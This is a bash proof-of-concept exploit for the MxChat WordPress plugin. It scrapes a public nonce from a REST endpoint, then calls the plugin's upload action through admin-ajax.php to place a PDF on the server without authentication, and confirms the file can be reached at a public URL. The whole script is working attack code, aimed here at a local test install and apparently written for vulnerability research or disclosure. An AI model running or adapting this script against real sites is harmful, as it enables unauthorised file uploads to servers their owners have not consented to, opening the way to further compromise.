#!/usr/bin/env bash
set -e

BASE="http://127.0.0.1/"
AJAX="$BASE/wp-admin/admin-ajax.php"
NONCE_URL="$BASE/wp-json/mxchat/v1/nonce"

NAME="mxchat_poc_$(date +%s).pdf"

python3 - <<PY
from reportlab.pdfgen import canvas
name = "$NAME"
c = canvas.Canvas(name)
c.drawString(100, 750, "MxChat unauthenticated PDF upload PoC")
c.drawString(100, 720, "Uploaded without authentication.")
c.save()
PY

NONCE=$(curl -s "$NONCE_URL" | grep -oE '[a-f0-9]{10,}' | head -1)

echo "[+] Public nonce: $NONCE"
echo "[+] Uploading PDF without login..."

RESP=$(curl -s -X POST "$AJAX" \
  -F "action=mxchat_upload_pdf" \
  -F "nonce=$NONCE" \
  -F "session_id=poc123" \
  -F "pdf_file=@$NAME;type=application/pdf")

echo "$RESP"

echo
echo "[+] Searching uploaded file..."
FOUND=$(find /home/kali/Downloads/test/wordpress/wp-content/uploads -name "mxchat_*.pdf" 2>/dev/null | tail -1)

if [ -z "$FOUND" ]; then
  echo "[-] Uploaded file not found on disk"
  exit 1
fi

BASENAME=$(basename "$FOUND")
URL="$BASE/wp-content/uploads/2026/06/$BASENAME"

echo "[+] Found: $FOUND"
echo "[+] Public URL: $URL"
echo "[+] Checking public access..."

curl -I "$URL"

echo
echo "[+] If HTTP/1.1 200 OK appears above, VULN CONFIRMED."
